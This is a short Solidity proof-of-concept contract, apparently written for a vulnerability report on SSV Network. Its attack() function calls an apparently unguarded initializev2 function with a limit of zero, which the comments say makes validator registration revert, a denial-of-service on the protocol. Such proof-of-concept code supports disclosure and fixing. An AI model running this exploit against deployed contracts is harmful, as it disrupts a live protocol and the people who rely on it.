// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISSVNetwork {
    function initializev2(uint32 validatorsPerOperatorLimit_) external;
}

contract PoC {
    ISSVNetwork ssv;

    constructor(address proxy) {
        ssv = ISSVNetwork(proxy);
    }

    function attack() external {
        // Step 1: attacker sets limit to 0
        ssv.initializev2(0);

        // Step 2: any validator operation now reverts
        // Example: registering a validator will fail
        // ssv.registerValidator(...); // <-- reverts
    }
}
